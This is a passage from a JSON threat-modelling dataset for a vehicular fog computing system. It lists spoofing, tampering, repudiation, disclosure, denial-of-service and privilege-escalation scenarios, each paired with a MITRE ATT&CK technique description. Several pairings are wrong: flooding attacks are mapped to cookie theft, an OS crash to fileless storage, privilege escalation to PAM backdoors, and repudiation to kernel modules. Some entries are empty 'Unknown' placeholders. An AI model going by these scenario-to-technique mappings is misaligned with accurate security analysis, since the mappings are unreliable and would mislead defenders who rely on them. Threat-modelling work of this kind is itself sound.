            "Assumptions": [
                {
                    "Assumption": "Unencrypted communication channels",
                    "Role": "Network Engineer",
                    "Condition": "Occurs if communication channels are not properly encrypted."
                },
                {
                    "Assumption": "Accessible network paths to eavesdrop",
                    "Role": "Security Specialist",
                    "Condition": "Occurs if network segments are not well-protected."
                }
            ],
            "Potential Impact": "Confidential data exposure and potential misuse of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "network",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Data stored in cloud services exposed due to insufficient access controls.",
            "Assumptions": [
                {
                    "Assumption": "Weak or misconfigured access control policies",
                    "Role": "Cloud Engineer",
                    "Condition": "Occurs if access policies are not properly enforced."
                },
                {
                    "Assumption": "Centralized cloud storage lacking encryption",
                    "Role": "Data Security Specialist",
                    "Condition": "Occurs if data at rest in the cloud is not encrypted."
                }
            ],
            "Potential Impact": "Sensitive data exposure leading to privacy violations and data breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "data breach",
                "access control"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker leverages a vulnerability in the fog node to gain unauthorized data access.",
            "Assumptions": [
                {
                    "Assumption": "Unknown or unpatched vulnerabilities in fog node software",
                    "Role": "System Developer",
                    "Condition": "Occurs if software vulnerabilities are not managed."
                },
                {
                    "Assumption": "Lack of intrusion detection systems (IDS) for fog nodes",
                    "Role": "Security Architect",
                    "Condition": "Occurs if IDS are not deployed for monitoring."
                }
            ],
            "Potential Impact": "Unauthorized data access and potential bypass of security controls.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "vulnerability",
                "software",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Direct Volume Access",
                "description": "Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)\n\nUtilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",
                "id": "attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5",
                "technique_id": "T1006"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods fog nodes with excessive requests, overwhelming their processing capacity.",
            "Assumptions": [
                {
                    "Assumption": "No rate-limiting controls on fog nodes",
                    "Role": "Network Administrator",
                    "Condition": "Occurs if request handling lacks proper throttling."
                },
                {
                    "Assumption": "Inadequate load balancing to distribute traffic",
                    "Role": "System Architect",
                    "Condition": "Occurs if load balancing mechanisms are not in place."
                }
            ],
            "Potential Impact": "Service disruption and degraded performance due to resource exhaustion.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flooding",
                "network",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets cloud services with a distributed denial of service (DDoS) attack.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services lack DDoS protection mechanisms",
                    "Role": "Cloud Security Specialist",
                    "Condition": "Occurs if DDoS mitigation tools are not implemented."
                },
                {
                    "Assumption": "Weak network infrastructure at cloud endpoints",
                    "Role": "Network Engineer",
                    "Condition": "Occurs if cloud endpoints are insufficiently protected."
                }
            ],
            "Potential Impact": "Widespread service outage and loss of data processing capabilities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "cloud",
                "network attack"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the fog node OS to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched OS vulnerabilities",
                    "Role": "System Maintainer",
                    "Condition": "Occurs if OS is not regularly updated."
                },
                {
                    "Assumption": "No system monitoring for abnormal behavior",
                    "Role": "Security Analyst",
                    "Condition": "Occurs if monitoring tools are not in use."
                }
            ],
            "Potential Impact": "Service disruption and unavailability of local processing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability",
                "OS",
                "crash"
            ],
            "mitre_technique": {
                "name": "Fileless Storage",
                "description": "Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless)\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) ",
                "id": "attack-pattern--02c5abff-30bf-4703-ab92-1f6072fae939",
                "technique_id": "T1027.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to fog nodes by exploiting weak access controls.",
            "Assumptions": [
                {
                    "Assumption": "Weak password policies or shared credentials",
                    "Role": "System Administrator",
                    "Condition": "Occurs if password policies are not strict or credentials are shared."
                },
                {
                    "Assumption": "Absence of multi-factor authentication for administrative tasks",
                    "Role": "Security Engineer",
                    "Condition": "Occurs if MFA is not enforced for sensitive operations."
                }
            ],
            "Potential Impact": "Complete control over fog nodes and unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "access control",
                "administrative access",
                "MFA"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a bug in the cloud service API to gain elevated permissions.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched vulnerabilities in the cloud service API",
                    "Role": "Cloud Developer",
                    "Condition": "Occurs if security patches are not applied."
                },
                {
                    "Assumption": "Insecure API configurations",
                    "Role": "System Developer",
                    "Condition": "Occurs if API security best practices are not followed."
                }
            ],
            "Potential Impact": "Escalated privileges leading to unauthorized cloud resource management.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "API",
                "cloud",
                "bug exploitation"
            ],
            "mitre_technique": {
                "name": "Cloud Groups",
                "description": "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.\n\nWith authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).\n\nAzure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command <code>az ad user get-member-groups</code> will list groups associated to a user account for Azure while the API endpoint <code>GET https://cloudidentity.googleapis.com/v1/groups</code> lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)\n\nAdversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS <code>GetBucketAcl</code> API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
                "id": "attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2",
                "technique_id": "T1069.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a local privilege escalation (LPE) exploit on fog nodes to achieve root access.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched LPE vulnerabilities in the fog node OS",
                    "Role": "System Maintainer",
                    "Condition": "Occurs if known LPE exploits are not mitigated."
                },
                {
                    "Assumption": "Insecure execution of processes on the fog node",
                    "Role": "System Administrator",
                    "Condition": "Occurs if process isolation is not enforced."
                }
            ],
            "Potential Impact": "Full system control and potential further compromise of connected nodes.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "LPE",
                "OS",
                "root access"
            ],
            "mitre_technique": {
                "name": "Pluggable Authentication Modules",
                "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)",
                "id": "attack-pattern--06c00069-771a-4d57-8ef5-d3718c1a8771",
                "technique_id": "T1556.003"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "26",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker impersonates a legitimate vehicle's identity to send false data to the fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Lack of strong authentication mechanisms",
                    "Role": "System Designer",
                    "Condition": "No robust device authentication in place"
                },
                {
                    "Assumption": "Attacker has access to vehicle identity credentials",
                    "Role": "Attacker",
                    "Condition": "Stolen or compromised credentials"
                },
                {
                    "Assumption": "Fog nodes lack additional validation checks",
                    "Role": "System Designer",
                    "Condition": "No redundancy in validation"
                }
            ],
            "Potential Impact": "Unauthorized data injection leading to data corruption.",
            "MITRE ATT&CK Keywords": [
                "identity spoofing",
                "vehicle data falsification",
                "injection",
                "device impersonation"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker mimics fog nodes to intercept and manipulate data from vehicles.",
            "Assumptions": [
                {
                    "Assumption": "Network lacks mutual authentication",
                    "Role": "System Designer",
                    "Condition": "Weak or one-sided authentication"
                },
                {
                    "Assumption": "Attacker can position spoofed node",
                    "Role": "Attacker",
                    "Condition": "Physical or network access to fog node location"
                },
                {
                    "Assumption": "Vehicles trust nearby fog nodes unquestioningly",
                    "Role": "Vehicle Manufacturers",
                    "Condition": "No rigorous trust establishment"
                }
            ],
            "Potential Impact": "Man-in-the-middle attack leading to unauthorized data access and modification.",
            "MITRE ATT&CK Keywords": [
                "MITM",
                "data interception",
                "falsification",
                "network spoofing"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses malicious RSUs to provide false traffic information.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication for roadside units",
                    "Role": "System Designer",
                    "Condition": "No or weak authentication protocols"
                },
                {
                    "Assumption": "Attacker has access to RSU credentials or can install rogue RSUs",
                    "Role": "Attacker",
                    "Condition": "Compromised or stolen credentials"
                },
                {
                    "Assumption": "Vehicles and other nodes trust traffic information from any nearby RSU",
                    "Role": "System Designer",
                    "Condition": "Implicit trust in all units"
                }
            ],
            "Potential Impact": "Misinformation affecting traffic flow and safety.",
            "MITRE ATT&CK Keywords": [
                "traffic manipulation",
                "RSU spoofing",
                "network trust exploitation",
                "false data injection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker alters firmware of fog nodes to change their behavior.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient firmware validation and secure update mechanisms",
                    "Role": "System Designer",
                    "Condition": "Weak validation of firmware integrity"
                },
                {
                    "Assumption": "Attacker gains physical or network access to the fog nodes",
                    "Role": "Attacker",
                    "Condition": "Physical access or network intrusion capabilities"
                },
                {
                    "Assumption": "No monitoring to detect unexpected firmware changes",
                    "Role": "System Administrator",
                    "Condition": "Lack of firmware change monitoring"
                }
            ],
            "Potential Impact": "Unauthorized control over processing and decision-making affecting system integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "node compromise",
                "system integrity corruption",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware injection into the VFC system via compromised vehicles.",
            "Assumptions": [
                {
                    "Assumption": "Vehicles do not validate or sanitize incoming data adequately",
                    "Role": "Vehicle Manufacturers",
                    "Condition": "Lack of stringent data validation protocols"
                },
                {
                    "Assumption": "Presence of vulnerabilities that can be exploited by malware",
                    "Role": "Developers",
                    "Condition": "Unpatched software or known vulnerabilities"
                },
                {
                    "Assumption": "Attacker can inject malicious data into vehicle systems",
                    "Role": "Attacker",
                    "Condition": "Access to vehicle communication interfaces"
                }
            ],
            "Potential Impact": "Propagation of malware through the VFC system affecting integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "malware injection",
                "data corruption",
                "system compromise",
                "vehicle network"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Data alteration during transmission from fog nodes to cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Weak encryption or lack thereof in data transmission",
                    "Role": "System Designer",
                    "Condition": "No or weak encryption protocols"
                },
                {
                    "Assumption": "Attacker can intercept and modify data en route",
                    "Role": "Attacker",
                    "Condition": "Network access and interception capabilities"
                },
                {
                    "Assumption": "Lack of integrity checks on received data",
                    "Role": "System Administrator",
                    "Condition": "No or insufficient integrity verification"
                }
            ],
            "Potential Impact": "Corruption of data leading to unreliable analytics and decisions in cloud services.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "transmission tampering",
                "data integrity violation",
                "network attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Malicious vehicle denies sending harmful data after causing an accident.",
            "Assumptions": [
                {
                    "Assumption": "No non-repudiation mechanisms in place",
                    "Role": "System Designer",
                    "Condition": "Lack of digital signatures or audit logs"
                },
                {
                    "Assumption": "Vehicles can communicate without leaving reliable traces",
                    "Role": "Vehicle Manufacturers",
                    "Condition": "Lack of proper logging"
                },
                {
                    "Assumption": "Logs can be altered by the attacker",
                    "Role": "Attacker",
                    "Condition": "Access to log files and editing capabilities"
                }
            ],
            "Potential Impact": "Difficulty in assigning accountability and resolving disputes.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "dispute",
                "data falsification",
                "audit log manipulation"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A fog node administrator performs unauthorized actions and denies it.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls and logging mechanisms",
                    "Role": "System Designer",
                    "Condition": "Inadequate access and log controls"
                },
                {
                    "Assumption": "Logs can be edited or deleted by administrators",
                    "Role": "System Administrator",
                    "Condition": "Insufficient log protection"
                },
                {
                    "Assumption": "Lack of independent audit trails",
                    "Role": "System Designer",
                    "Condition": "No external auditing mechanisms"
                }
            ],
            "Potential Impact": "Challenges in forensic investigations and establishing accountability.",
            "MITRE ATT&CK Keywords": [
                "administrator abuse",
                "log alteration",
                "unauthorized actions",
                "audit evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Cloud service provider denies receiving and storing critical data from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient logging of data transfers",
                    "Role": "System Designer",
                    "Condition": "No comprehensive transfer logs"
                },
                {
                    "Assumption": "Logs do not have tamper-proof mechanisms",
                    "Role": "System Administrator",
                    "Condition": "No tamper-resistant logging in place"
                },
                {
                    "Assumption": "No third-party validation of data transfers",
                    "Role": "System Designer",
                    "Condition": "Lack of independent verification systems"
                }
            ],
            "Potential Impact": "Data loss claims and trust issues between stakeholders.",
            "MITRE ATT&CK Keywords": [
                "data transfer denial",
                "service provider dispute",
                "transaction repudiation",
                "log tampering"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
